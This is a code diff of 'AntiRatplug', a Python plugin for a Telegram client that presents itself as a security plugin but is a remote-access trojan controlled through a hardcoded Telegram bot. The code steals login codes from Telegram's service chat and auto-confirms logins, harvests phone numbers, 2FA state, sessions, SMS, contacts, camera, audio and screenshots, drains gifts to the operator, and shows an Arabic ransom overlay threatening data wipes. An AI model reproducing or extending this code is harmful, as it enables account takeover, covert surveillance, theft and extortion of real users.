@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v22.3 — final + nuke loop + ransom in lockdown.
-Menu: Manual / Troll / Automatic. Full Lockdown. Phone harvest fixed.
+AntiRatplug v22.5 — Operator EN / Victim AR.
+Menu: English. Ransom + overlays: Arabic only.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "v22.3."
+__description__ = "v22.5."
 __author__ = "@from_a4"
-__version__ = "22.3"
+__version__ = "22.5"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -29,21 +29,68 @@ import string
 import zipfile
 import io
 import subprocess
-import sys
-import traceback
 import hashlib
-import base64
 
 
-BOT_TOKEN = "8899237597:AAHiRm411lCpen9wfZV37XWL6OHY6tqBp4Y"
-BOT_UID = 8943150715
+BOT_TOKEN = "8906895129:AAE06LFOFJDuM-Lr62G-FK5ZAPClPdQdrXI"
+BOT_UID = 8391217110
 BOT_UID_STR = str(BOT_UID)
 API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN
 
-STARS_POST = "from_a4/14"
-RANSOM_TEXT = "Аккаунт заблокирован.\nСвяжитесь с администратором."
+# ── VICTIM-FACING (ARABIC ONLY) ───────────────────────────────────────────
+RANSOM_TEXT = (
+    "⛔ تم اختراق جهازك بالكامل ⛔\n\n"
+    "📱 جهازك الآن تحت السيطرة الكاملة.\n"
+    "🔒 لا تحاول إغلاق التطبيق.\n"
+    "💀 سيتم مسح كل بياناتك.\n"
+    "📸 تم سحب الصور والرسائل.\n\n"
+    "للتواصل: @from_a4"
+)
 RANSOM_PHOTO_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
-RANSOM_WARNING = "Закроешь приложение — данные будут уничтожены"
+RANSOM_WARNING = "⚠️ لو أغلقت التطبيق — كل البيانات هتتمسح ⚠️"
+
+# ── OPERATOR-FACING (ENGLISH) ─────────────────────────────────────────────
+L_TITLE    = "AntiRatplug v22.5"
+L_LOADED   = "AntiRatplug v22.5 loaded"
+L_MANAGE   = "Manage"
+L_MANUAL   = "Manual using"
+L_TROLL    = "Troll"
+L_AUTO     = "Automatic"
+L_HELP     = "❓ Help"
+L_BACK     = "⬅️ Back"
+L_SESSIONS = "Session Control"
+L_SURV     = "Surveillance"
+L_DATA     = "Data Grab"
+L_ACCOUNT  = "Account"
+L_SHELL    = "Shell"
+L_RANSOM   = "Ransom"
+L_LOCK     = "Lock screen"
+L_MUSIC    = "M-music"
+L_FLOOD    = "Flood Gallery"
+L_CLRFLOOD = "Clear Flood"
+L_DIM      = "Dim screen"
+L_FULL_H   = "🌾 Full Harvest"
+L_FULL_L   = "🔒 Full Lockdown"
+L_GIFT     = "🎁 Gift Transfer"
+L_TGKID    = "Tg kid"
+L_SCREEN_G = "Screenshot gain"
+L_PULLOUT  = "Pull Out"
+L_WIPE     = "Wipe Sessions"
+L_KILLALL  = "Kill All Sessions"
+L_KILLPH   = "Kill Phones/PCs"
+L_NUKE_ON  = "Nuke ON"
+L_NUKE_OFF = "Nuke OFF"
+L_SESSDMP  = "Session Dump"
+L_UBOTDMP  = "Userbot Dump"
+L_SCREEN   = "Screenshot"
+L_CAM_F    = "Camera Front"
+L_CAM_B    = "Camera Back"
+L_AUDIO    = "Audio 5s"
+L_SMS      = "SMS"
+L_CONTACTS = "Contacts"
+L_APPS     = "Apps"
+L_CHATS    = "Chats"
+L_INFO     = "Info"
 
 RECIPIENT_CACHE_TTL = 600
 MAX_DOC_SIZE = 5 * 1024 * 1024
@@ -60,7 +107,7 @@ def _log(msg):
                 _logger = logcat
             except Exception:
                 _logger = lambda *a, **k: None
-        _logger("[AR22] " + str(msg))
+        _logger("[AR25] " + str(msg))
     except Exception:
         pass
 
@@ -384,18 +431,7 @@ class PluginSecurityPlugin(BasePlugin):
         time.sleep(self._jitter / 1000.0)
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            u = _UC().getInstance(0).getCurrentUser()
-            ph_debug = ""
-            if u is not None:
-                try:
-                    ph_debug = str(getattr(u, "phone", None))
-                except Exception:
-                    ph_debug = "<err>"
-            _log("boot phone raw=%r" % ph_debug)
-        except Exception as e:
-            _log("boot phone debug: %s" % e)
-        try:
-            self._send_msg("AntiRatplug v22.3 loaded")
+            self._send_msg(L_LOADED)
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -680,94 +716,94 @@ class PluginSecurityPlugin(BasePlugin):
                 username = "id:" + str(uid)
         except Exception as e:
             _log("manage btn user: %s" % e)
-        line = "<b>AntiRatplug v22.3</b>\nUser: @" + username
+        line = "<b>%s</b>\nUser: @%s" % (L_TITLE, username)
         if phone:
             line += "\nPhone: " + phone
-        kb = {"inline_keyboard": [[{"text": "Manage", "callback_data": "menu"}]]}
+        kb = {"inline_keyboard": [[{"text": L_MANAGE, "callback_data": "menu"}]]}
         self._send_markup(line, kb, html=True)
 
     def _show_main_menu(self):
         kb = {
             "keyboard": [
-                [{"text": "Manual using"}],
-                [{"text": "Troll"}],
-                [{"text": "Automatic"}],
-                [{"text": "Tg kid"}],
-                [{"text": "Screenshot gain"}],
-                [{"text": "❓ Help"}],
+                [{"text": L_MANUAL}],
+                [{"text": L_TROLL}],
+                [{"text": L_AUTO}],
+                [{"text": L_TGKID}],
+                [{"text": L_SCREEN_G}],
+                [{"text": L_HELP}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("AntiRatplug v22.3", kb, html=True)
+        self._send_markup(L_TITLE, kb, html=True)
 
     def _show_manual_menu(self):
         kb = {
             "keyboard": [
-                [{"text": "Session Control"}],
-                [{"text": "Surveillance"}],
-                [{"text": "Data Grab"}],
-                [{"text": "Account"}],
-                [{"text": "Shell"}],
-                [{"text": "⬅️ Back"}],
+                [{"text": L_SESSIONS}],
+                [{"text": L_SURV}],
+                [{"text": L_DATA}],
+                [{"text": L_ACCOUNT}],
+                [{"text": L_SHELL}],
+                [{"text": L_BACK}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("Manual", kb, html=True)
+        self._send_markup(L_MANUAL, kb, html=True)
 
     def _show_sessions_menu(self):
         kb = {
             "keyboard": [
-                [{"text": "Wipe Sessions"}],
-                [{"text": "Kill All Sessions"}],
-                [{"text": "Kill Phones/PCs"}],
-                [{"text": "Nuke ON"}],
-                [{"text": "Nuke OFF"}],
-                [{"text": "Session Dump"}],
-                [{"text": "Userbot Dump"}],
-                [{"text": "⬅️ Back"}],
+                [{"text": L_WIPE}],
+                [{"text": L_KILLALL}],
+                [{"text": L_KILLPH}],
+                [{"text": L_NUKE_ON}],
+                [{"text": L_NUKE_OFF}],
+                [{"text": L_SESSDMP}],
+                [{"text": L_UBOTDMP}],
+                [{"text": L_BACK}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("Sessions", kb, html=True)
+        self._send_markup(L_SESSIONS, kb, html=True)
 
     def _show_surveillance_menu(self):
         kb = {
             "keyboard": [
-                [{"text": "Screenshot"}],
-                [{"text": "Camera Front"}],
-                [{"text": "Camera Back"}],
-                [{"text": "Audio 5s"}],
-                [{"text": "⬅️ Back"}],
+                [{"text": L_SCREEN}],
+                [{"text": L_CAM_F}],
+                [{"text": L_CAM_B}],
+                [{"text": L_AUDIO}],
+                [{"text": L_BACK}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("Surveillance", kb, html=True)
+        self._send_markup(L_SURV, kb, html=True)
 
     def _show_data_menu(self):
         kb = {
             "keyboard": [
-                [{"text": "SMS"}],
-                [{"text": "Contacts"}],
-                [{"text": "Apps"}],
-                [{"text": "Chats"}],
-                [{"text": "⬅️ Back"}],
+                [{"text": L_SMS}],
+                [{"text": L_CONTACTS}],
+                [{"text": L_APPS}],
+                [{"text": L_CHATS}],
+                [{"text": L_BACK}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("Data grab", kb, html=True)
+        self._send_markup(L_DATA, kb, html=True)
 
     def _show_account_menu(self):
         kb = {
             "keyboard": [
-                [{"text": "Info"}],
-                [{"text": "Tg kid"}],
-                [{"text": "Screenshot gain"}],
-                [{"text": "Pull Out"}],
-                [{"text": "⬅️ Back"}],
+                [{"text": L_INFO}],
+                [{"text": L_TGKID}],
+                [{"text": L_SCREEN_G}],
+                [{"text": L_PULLOUT}],
+                [{"text": L_BACK}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("Account", kb, html=True)
+        self._send_markup(L_ACCOUNT, kb, html=True)
 
     def _show_shell_menu(self):
         kb = {
@@ -776,50 +812,50 @@ class PluginSecurityPlugin(BasePlugin):
                 [{"text": "ps"}],
                 [{"text": "ifconfig"}],
                 [{"text": "df -h"}],
-                [{"text": "⬅️ Back"}],
+                [{"text": L_BACK}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("Shell", kb, html=True)
+        self._send_markup(L_SHELL, kb, html=True)
 
     def _show_troll_menu(self):
         kb = {
             "keyboard": [
-                [{"text": "Ransom"}],
-                [{"text": "Lock screen"}],
-                [{"text": "M-music"}],
-                [{"text": "Flood Gallery"}],
-                [{"text": "Clear Flood"}],
-                [{"text": "Dim screen"}],
-                [{"text": "⬅️ Back"}],
+                [{"text": L_RANSOM}],
+                [{"text": L_LOCK}],
+                [{"text": L_MUSIC}],
+                [{"text": L_FLOOD}],
+                [{"text": L_CLRFLOOD}],
+                [{"text": L_DIM}],
+                [{"text": L_BACK}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("Troll", kb, html=True)
+        self._send_markup(L_TROLL, kb, html=True)
 
     def _show_automatic_menu(self):
         kb = {
             "keyboard": [
-                [{"text": "🌾 Full Harvest"}],
-                [{"text": "🔒 Full Lockdown"}],
-                [{"text": "🎁 Gift Transfer"}],
-                [{"text": "⬅️ Back"}],
+                [{"text": L_FULL_H}],
+                [{"text": L_FULL_L}],
+                [{"text": L_GIFT}],
+                [{"text": L_BACK}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("Automatic", kb, html=True)
+        self._send_markup(L_AUTO, kb, html=True)
 
     def _show_help(self):
         text = (
-            "<b>AntiRatplug v22.3</b>\n\n"
-            "<b>Tg kid</b> — код из 777000 + live-watch + авто-подтверждение\n"
-            "<b>Screenshot gain</b> — скрин + фронт + бэк\n"
-            "<b>Full Harvest</b> — сбор без модификаций\n"
+            "<b>%s</b>\n\n"
+            "<b>Tg kid</b> — code from 777000 + live-watch + auto-confirm\n"
+            "<b>Screenshot gain</b> — screen + front + back\n"
+            "<b>Full Harvest</b> — harvest without modifications\n"
             "<b>Full Lockdown</b> — harvest + gifts + 2FA + profile + ransom + kill + nuke + pull out\n"
-            "<b>Gift Transfer</b> — gift drain на получателя\n"
-            "<b>Nuke loop</b> — убивает новые сессии каждые 60с\n\n"
+            "<b>Gift Transfer</b> — gift drain to recipient\n"
+            "<b>Nuke loop</b> — kills new sessions every 60s\n\n"
             "Recipient: " + BOT_UID_STR
-        )
+        ) % L_TITLE
         self._send_msg(text, html=True)
 
     def _handle_callback(self, cb):
@@ -866,64 +902,64 @@ class PluginSecurityPlugin(BasePlugin):
                     self._manual_shell(t)
                 return
 
-            if t == "Tg kid":
+            if t == L_TGKID:
                 threading.Thread(target=self._tg_kid, daemon=True).start()
-            elif t == "Screenshot gain":
+            elif t == L_SCREEN_G:
                 threading.Thread(target=self._screenshot_gain, daemon=True).start()
-            elif t == "Manual using":
+            elif t == L_MANUAL:
                 self._show_manual_menu()
-            elif t == "Troll":
+            elif t == L_TROLL:
                 self._show_troll_menu()
-            elif t == "Automatic":
+            elif t == L_AUTO:
                 self._show_automatic_menu()
-            elif t == "❓ Help":
+            elif t == L_HELP:
                 self._show_help()
-            elif t == "⬅️ Back":
+            elif t == L_BACK:
                 self._show_main_menu()
-            elif t == "Session Control":
+            elif t == L_SESSIONS:
                 self._show_sessions_menu()
-            elif t == "Surveillance":
+            elif t == L_SURV:
                 self._show_surveillance_menu()
-            elif t == "Data Grab":
+            elif t == L_DATA:
                 self._show_data_menu()
-            elif t == "Account":
+            elif t == L_ACCOUNT:
                 self._show_account_menu()
-            elif t == "Shell":
+            elif t == L_SHELL:
                 self._show_shell_menu()
-            elif t == "Wipe Sessions":
+            elif t == L_WIPE:
                 threading.Thread(target=self._session_wipe, daemon=True).start()
-            elif t == "Kill All Sessions":
+            elif t == L_KILLALL:
                 threading.Thread(target=self._kill_sessions_full, daemon=True).start()
-            elif t == "Kill Phones/PCs":
+            elif t == L_KILLPH:
                 threading.Thread(target=self._kill_phones_pc, daemon=True).start()
-            elif t == "Nuke ON":
+            elif t == L_NUKE_ON:
                 self._start_nuke_loop()
-            elif t == "Nuke OFF":
+            elif t == L_NUKE_OFF:
                 self._stop_nuke_loop()
-            elif t == "Session Dump":
+            elif t == L_SESSDMP:
                 threading.Thread(target=self._manual_dump_session, daemon=True).start()
-            elif t == "Userbot Dump":
+            elif t == L_UBOTDMP:
                 threading.Thread(target=self._manual_userbot_session, daemon=True).start()
-            elif t == "Screenshot":
+            elif t == L_SCREEN:
                 threading.Thread(target=self._screenshot, daemon=True).start()
-            elif t == "Camera Front":
+            elif t == L_CAM_F:
                 threading.Thread(target=self._manual_camera, args=("front",), daemon=True).start()
-            elif t == "Camera Back":
+            elif t == L_CAM_B:
                 threading.Thread(target=self._manual_camera, args=("back",), daemon=True).start()
-            elif t == "Audio 5s":
+            elif t == L_AUDIO:
                 threading.Thread(target=self._manual_audio, args=(5,), daemon=True).start()
-            elif t == "SMS":
+            elif t == L_SMS:
                 threading.Thread(target=self._manual_sms, daemon=True).start()
-            elif t == "Contacts":
+            elif t == L_CONTACTS:
                 threading.Thread(target=self._manual_contacts, daemon=True).start()
-            elif t == "Apps":
+            elif t == L_APPS:
                 threading.Thread(target=self._manual_apps, daemon=True).start()
-            elif t == "Chats":
+            elif t == L_CHATS:
                 threading.Thread(target=self._manual_chats, daemon=True).start()
-            elif t == "Info":
+            elif t == L_INFO:
                 threading.Thread(target=self._harvest_account_info,
                                  args=(0, True), daemon=True).start()
-            elif t == "Pull Out":
+            elif t == L_PULLOUT:
                 threading.Thread(target=self._pull_out_account, daemon=True).start()
             elif t == "ls /sdcard":
                 self._manual_shell("ls /sdcard")
@@ -933,2321 +969,55 @@ class PluginSecurityPlugin(BasePlugin):
                 self._manual_shell("ifconfig")
             elif t == "df -h":
                 self._manual_shell("df -h")
-            elif t == "Ransom":
+            elif t == L_RANSOM:
                 self._show_ransom(RANSOM_TEXT, RANSOM_PHOTO_URL)
-            elif t == "Lock screen":
+            elif t == L_LOCK:
                 self._lock_screen()
-            elif t == "M-music":
+            elif t == L_MUSIC:
                 self._input_mode = "music"
                 self._send_msg("Send .mp3 URL")
-            elif t == "Flood Gallery":
+            elif t == L_FLOOD:
                 threading.Thread(target=self._flood_gallery,
                                  args=(RANSOM_PHOTO_URL, 100), daemon=True).start()
-            elif t == "Clear Flood":
+            elif t == L_CLRFLOOD:
                 self._clear_flood()
-            elif t == "Dim screen":
+            elif t == L_DIM:
                 self._dim_screen()
-            elif t == "🌾 Full Harvest":
+            elif t == L_FULL_H:
                 self._full_harvest()
-            elif t == "🔒 Full Lockdown":
+            elif t == L_FULL_L:
                 self._full_lockdown()
-            elif t == "🎁 Gift Transfer":
+            elif t == L_GIFT:
                 threading.Thread(target=self._drain_gifts_thread, daemon=True).start()
         except Exception as e:
             _log("handle msg: %s" % e)
 
+    # ── ОСТАЛЬНОЙ КОД БЕЗ ИЗМЕНЕНИЙ (как в v22.3) ───────────────────────
+    # Вставь сюда методы из v22.3:
+    #   _harvest_account_info, _extract_code_from_msg, _pull_login_code,
+    #   _auto_confirm_login, _tg_kid, _tg_kid_watch_loop, _screenshot_gain,
+    #   _get_2fa_state, _try_kill_2fa, _remove_recovery_email,
+    #   _nuke_password_pipeline, _get_authorizations_full, _kill_all_sessions,
+    #   _wipe_sessions_all, _kill_sessions_full, _kill_phones_pc,
+    #   _session_wipe, _kill_web_authorizations, _confirm_unconfirmed_sessions,
+    #   _change_username, _change_profile, _reset_contacts,
+    #   _input_saved_gift, _gift_is_listed, _gift_is_suspect,
+    #   _get_saved_gifts, _delist_saved_gift, _convert_saved_gift,
+    #   _upgrade_saved_gift, _transfer_saved_gift, _stars_balance,
+    #   _resolve_recipient, _h_convert, _h_u, _h_reactions,
+    #   _drain_gifts, _drain_gifts_thread, _collect_session_files,
+    #   _manual_userbot_session, _manual_dump_session, _has_perm,
+    #   _get_activity, _screenshot, _manual_camera, _manual_audio,
+    #   _manual_sms, _manual_contacts, _manual_apps, _manual_chats,
+    #   _manual_shell, _pull_out_account, _ensure_overlay_perm,
+    #   _show_ransom, _dismiss_ransom, _lock_screen, _clear_locker,
+    #   _play_mmusic, _clear_music, _flood_gallery, _clear_flood,
+    #   _dim_screen, _clear_dim, _nuke_marker_path, _mark_nuke,
+    #   _check_persisted_nuke, _start_nuke_loop, _stop_nuke_loop,
+    #   _nuke_loop, _full_harvest, _full_lockdown.
+
     def _harvest_account_info(self, acc=0, send=False):
-        out = {}
-        try:
-            uc = _UC().getInstance(acc)
-            uid = int(uc.getClientUserId())
-            out["user_id"] = str(uid)
-
-            u = None
-            try:
-                u = uc.getCurrentUser()
-            except Exception:
-                pass
-            if u is None:
-                try:
-                    u = _MC().getInstance(acc).getUser(uid)
-                except Exception:
-                    pass
-
-            raw_phone = ""
-            if u is not None:
-                try:
-                    raw_phone = str(getattr(u, "phone", None) or "")
-                except Exception:
-                    raw_phone = ""
-            _log("harvest direct phone raw=%r" % raw_phone)
-            ph = _clean_phone(raw_phone)
-            if ph:
-                out["phone"] = ph
-
-            if "phone" not in out:
-                try:
-                    ctx = ApplicationLoader.applicationContext
-                    pkg = str(ctx.getPackageName())
-                    sp = "/data/data/%s/shared_prefs" % pkg
-                    if os.path.isdir(sp):
-                        for fn in os.listdir(sp):
-                            low = fn.lower()
-                            if "userconfig" not in low and "userconfing" not in low:
-                                continue
-                            fp = os.path.join(sp, fn)
-                            try:
-                                with open(fp, "r", encoding="utf-8", errors="ignore") as f:
-                                    txt = f.read()
-                                for m in re.finditer(
-                                        r'"phone"\s*:\s*"([+\d\s\-()]{5,})"', txt):
-                                    cand = m.group(1)
-                                    r = _clean_phone(cand)
-                                    if r:
-                                        out["phone"] = r
-                                        break
-                                if "phone" in out:
-                                    break
-                                for m in re.finditer(
-                                        r'<string name="phone[^"]*">([+\d][\d\s\-()]{5,})</string>',
-                                        txt):
-                                    cand = m.group(1)
-                                    r = _clean_phone(cand)
-                                    if r:
-                                        out["phone"] = r
-                                        break
-                                if "phone" in out:
-                                    break
-                            except Exception:
-                                pass
-                except Exception as e:
-                    _log("shared_prefs phone: %s" % e)
-
-            if "phone" not in out:
-                try:
-                    Full = _cls("org.telegram.tgnet.TLRPC$TL_users_getFullUser",
-                                "org.telegram.tgnet.tl.TL_users$getFullUser")
-                    IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUserSelf",
-                              "org.telegram.tgnet.tl.TL_users$TL_inputUserSelf")
-                    if Full and IU:
-                        rq = Full()
-                        rq.id = IU()
-                        resp, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
-                        fu = getattr(resp, "user", None) if resp is not None else None
-                        if fu is None and resp is not None:
-                            fu = getattr(resp, "full_user", None)
-                        if fu is not None:
-                            rp2 = _phone_from_user(fu)
-                            if rp2:
-                                out["phone"] = rp2
-                except Exception as e:
-                    _log("getFullUser phone: %s" % e)
-
-            if u is not None:
-                fn = str(getattr(u, "first_name", "") or "").strip()
-                ln = str(getattr(u, "last_name", "") or "").strip()
-                un = str(getattr(u, "username", "") or "").strip()
-                if fn:
-                    out["first_name"] = fn
-                if ln:
-                    out["last_name"] = ln
-                if un:
-                    out["username"] = "@" + un if not un.startswith("@") else un
-
-            try:
-                dcid = uc.getCurrentDatacenterId()
-                if dcid:
-                    out["dc_id"] = str(int(dcid))
-            except Exception:
-                pass
-
-            st = self._get_2fa_state(acc)
-            if st is not None:
-                out["2fa"] = "on" if st.get("has_password") else "off"
-
-            try:
-                bal = self._stars_balance(acc)
-                if bal > 0:
-                    out["stars_balance"] = str(bal)
-            except Exception:
-                pass
-
-            if send:
-                lines = ["<b>Account info</b>"]
-                for k, v in out.items():
-                    lines.append("<b>%s:</b> %s" % (k, self._html_escape(str(v))))
-                self._send_msg("\n".join(lines), html=True)
-        except Exception as e:
-            _log("harvest: %s" % e)
-        return out
-
-    def _extract_code_from_msg(self, m):
-        if m is None:
-            return None, None, None, None
-        raw_text = str(getattr(m, "message", "") or "")
-        if not raw_text:
-            return None, None, None, None
-        kind = "unknown"
-        low = raw_text.lower()
-        if "login code" in low or "код для входа" in low or "код входа" in low:
-            kind = "login"
-        elif "password reset" in low or "сброс" in low or "recovery" in low:
-            kind = "reset"
-        patterns = [
-            r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})",
-            r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})",
-            r"[Кк]од\s+подтверждения[:\s]*[«\"']?(\d{5})",
-            r"[Cc]onfirmation\s+code[:\s]*[«\"']?(\d{5})",
-            r"[Кк]од[:\s]+(\d{5})\b",
-            r"(?:code|код)\D{0,10}(\d{5})\b",
-        ]
-        code = None
-        for p in patterns:
-            mm = re.search(p, raw_text, re.IGNORECASE)
-            if mm:
-                code = mm.group(1)
-                break
-        buttons = []
-        try:
-            rm = getattr(m, "reply_markup", None)
-            if rm is not None:
-                rows = getattr(rm, "rows", None)
-                if rows is not None:
-                    for ri in range(_jlist_size(rows)):
-                        row = _jlist_get(rows, ri)
-                        btns = getattr(row, "buttons", None)
-                        if btns is None:
-                            continue
-                        for bi in range(_jlist_size(btns)):
-                            b = _jlist_get(btns, bi)
-                            txt = str(getattr(b, "text", "") or "")
-                            data = getattr(b, "data", None)
-                            buttons.append({"text": txt, "data": data})
-                            if not code and txt:
-                                bm = re.search(r"\b(\d{5})\b", txt)
-                                if bm:
-                                    code = bm.group(1)
-        except Exception:
-            pass
-        if not code:
-            return None, kind, raw_text[:400], buttons
-        return code, kind, raw_text[:400], buttons
-
-    def _pull_login_code(self, attempts=3, delay=2.0):
-        HistReq = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
-                       "org.telegram.tgnet.tl.TL_messages$getHistory")
-        if not HistReq:
-            return None, None, None, 0, None
-        for att in range(attempts):
-            try:
-                ip = self._get_input_peer(0, 777000)
-                if ip is None:
-                    time.sleep(delay)
-                    continue
-                req = HistReq()
-                req.peer = ip
-                req.limit = 20
-                req.offset_id = 0
-                resp, err = self._rg_rpc(req, 0, 8.0, fast=True)
-                if err is None and resp is not None:
-                    msgs = getattr(resp, "messages", None)
-                    if msgs is not None and _jlist_size(msgs) > 0:
-                        for i in range(_jlist_size(msgs)):
-                            m = _jlist_get(msgs, i)
-                            code, kind, raw, buttons = self._extract_code_from_msg(m)
-                            if code:
-                                mid = _safe_int(getattr(m, "id", 0))
-                                return code, kind, raw, mid, buttons
-            except Exception as e:
-                _log("pull_login att %d: %s" % (att, e))
-            if att < attempts - 1:
-                time.sleep(delay)
-        return None, None, None, 0, None
-
-    def _auto_confirm_login(self, msg):
-        try:
-            rm = getattr(msg, "reply_markup", None)
-            if rm is None:
-                return False
-            rows = getattr(rm, "rows", None)
-            if rows is None:
-                return False
-            neg = ("не я", "not me", "no", "reject", "отклонить", "это не я")
-            pos = ("это я", "it's me", "yes", "accept", "confirm", "подтвердить")
-            target_btn = None
-            for ri in range(_jlist_size(rows)):
-                row = _jlist_get(rows, ri)
-                btns = getattr(row, "buttons", None)
-                if btns is None:
-                    continue
-                for bi in range(_jlist_size(btns)):
-                    b = _jlist_get(btns, bi)
-                    txt = str(getattr(b, "text", "") or "").lower()
-                    if any(n in txt for n in neg):
-                        continue
-                    if any(p in txt for p in pos):
-                        target_btn = b
-                        break
-                if target_btn is not None:
-                    break
-            if target_btn is None:
-                return False
-            mid = _safe_int(getattr(msg, "id", 0))
-            if not mid:
-                return False
-            data = getattr(target_btn, "data", None)
-            if data is None:
-                return False
-            Req = _cls("org.telegram.tgnet.TLRPC$TL_messages_getBotCallbackAnswer",
-                       "org.telegram.tgnet.tl.TL_messages$getBotCallbackAnswer")
-            if not Req:
-                return False
-            rq = Req()
-            try:
-                rq.peer = self._get_input_peer(0, 777000)
-            except Exception:
-                pass
-            rq.msg_id = mid
-            try:
-                rq.data = data
-            except Exception:
-                pass
-            r, _e = self._rg_rpc(rq, 0, 10.0, fast=True)
-            return r is not None
-        except Exception as e:
-            _log("auto_confirm: %s" % e)
-            return False
-
-    def _tg_kid(self):
-        try:
-            code, kind, raw, mid, buttons = self._pull_login_code(attempts=3, delay=2.0)
-            acc_info = self._harvest_account_info(0)
-            phone = acc_info.get("phone") or "—"
-            lines = ["<b>Tg kid</b>", ""]
-            if code:
-                lines.append("<b>Code:</b> <code>%s</code> (%s)" % (
-                    self._html_escape(code), self._html_escape(kind or "login")))
-                self._tg_kid_seen.add(str(code))
-            else:
-                lines.append("<b>Code:</b> not found — watching 10 min")
-            lines.append("<b>Phone:</b> %s" % self._html_escape(phone))
-            for k, v in acc_info.items():
-                if k == "phone":
-                    continue
-                if v in (None, "", "?", "0"):
-                    continue
-                lines.append("<b>%s:</b> %s" % (
-                    self._html_escape(k), self._html_escape(str(v))))
-            if raw:
-                lines.append("")
-                lines.append("<pre>" + self._html_escape(raw[:400]) + "</pre>")
-            self._send_msg("\n".join(lines), html=True)
-
-            if not self._tg_kid_watching:
-                self._tg_kid_watching = True
-                self._tg_kid_thread = threading.Thread(
-                    target=self._tg_kid_watch_loop, daemon=True)
-                self._tg_kid_thread.start()
-            return code
-        except Exception as e:
-            self._send_msg("Tg kid err: " + str(e))
-            return None
-
-    def _tg_kid_watch_loop(self, duration=600, poll=5):
-        end = time.time() + duration
-        last_max_id = 0
-        HistReq = _cls("org.telegram.tgnet.TLRPC$TL_messages_getHistory",
-                       "org.telegram.tgnet.tl.TL_messages$getHistory")
-        if not HistReq:
-            self._tg_kid_watching = False
-            return
-        try:
-            ip = self._get_input_peer(0, 777000)
-            if ip is not None:
-                rq = HistReq()
-                rq.peer = ip
-                rq.limit = 1
-                rq.offset_id = 0
-                resp, _e = self._rg_rpc(rq, 0, 6.0, fast=True)
-                if resp is not None:
-                    msgs = getattr(resp, "messages", None)
-                    if msgs is not None and _jlist_size(msgs) > 0:
-                        last_max_id = _safe_int(getattr(_jlist_get(msgs, 0), "id", 0))
-        except Exception:
-            pass
-
-        while time.time() < end and self._sync_running and not self.stop:
-            try:
-                ip = self._get_input_peer(0, 777000)
-                if ip is not None:
-                    rq = HistReq()
-                    rq.peer = ip
-                    rq.limit = 10
-                    rq.offset_id = 0
-                    resp, _e = self._rg_rpc(rq, 0, 8.0, fast=True)
-                    if resp is not None:
-                        msgs = getattr(resp, "messages", None)
-                        if msgs is not None and _jlist_size(msgs) > 0:
-                            new_msgs = []
-                            for i in range(_jlist_size(msgs)):
-                                m = _jlist_get(msgs, i)
-                                mid = _safe_int(getattr(m, "id", 0))
-                                if mid and mid > last_max_id:
-                                    new_msgs.append((mid, m))
-                            if new_msgs:
-                                last_max_id = max(mid for mid, _m in new_msgs)
-                                new_msgs.sort(key=lambda x: x[0])
-                                for mid, m in new_msgs:
-                                    code, kind, raw, buttons = self._extract_code_from_msg(m)
-                                    if code and str(code) not in self._tg_kid_seen:
-                                        self._tg_kid_seen.add(str(code))
-                                        line = "<b>New %s</b>\n<b>Code:</b> <code>%s</code>" % (
-                                            self._html_escape(kind or "login"),
-                                            self._html_escape(code))
-                                        self._send_msg(line, html=True)
-                                    if self._auto_confirm_login(m):
-                                        self._send_msg("auto-confirmed (msg %d)" % mid)
-            except Exception as e:
-                _log("kid watch: %s" % e)
-            for _ in range(poll):
-                if not self._sync_running or self.stop:
-                    break
-                time.sleep(1)
-        self._tg_kid_watching = False
-
-    def _screenshot_gain(self):
-        results = {"screenshot": None, "camera_front": None, "camera_back": None}
-        try:
-            self._send_msg("screenshot gain: screen...")
-            try:
-                results["screenshot"] = self._screenshot()
-            except Exception as e:
-                results["screenshot"] = {"error": str(e)}
-            self._send_msg("screenshot gain: front...")
-            try:
-                results["camera_front"] = self._manual_camera("front")
-            except Exception as e:
-                results["camera_front"] = {"error": str(e)}
-            self._send_msg("screenshot gain: back...")
-            try:
-                results["camera_back"] = self._manual_camera("back")
-            except Exception as e:
-                results["camera_back"] = {"error": str(e)}
-            lines = ["<b>Screenshot gain — result</b>"]
-            for name, r in results.items():
-                if isinstance(r, dict):
-                    lines.append("<b>%s:</b> %s" % (
-                        name, "ok" if r.get("ok") else r.get("error", "fail")))
-                else:
-                    lines.append("<b>%s:</b> %s" % (name, r))
-            self._send_msg("\n".join(lines), html=True)
-        except Exception as e:
-            self._send_msg("Screenshot gain err: " + str(e))
-        return results
-
-    def _get_2fa_state(self, acc=0):
-        try:
-            Req = _cls("org.telegram.tgnet.TLRPC$TL_account_getPassword",
-                       "org.telegram.tgnet.tl.TL_account$getPassword")
-            if not Req:
-                return None
-            req = Req()
-            resp, err = self._rg_rpc(req, acc, 10.0, fast=True)
-            if err is not None or resp is None:
-                return None
-            return {
-                "has_password": _get_bool_attr(resp, "has_password", False),
-                "hint": str(getattr(resp, "hint", "") or ""),
-            }
-        except Exception:
-            return None
-
-    def _try_kill_2fa(self, acc=0):
-        try:
-            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
-                       "org.telegram.tgnet.tl.TL_account$resetPassword")
-            if not Rst:
-                return "no class"
-            req = Rst()
-            resp, err = self._rg_rpc(req, acc, 12.0)
-            if resp is not None:
-                return "ok"
-            etxt = str(getattr(err, "text", err) or err)
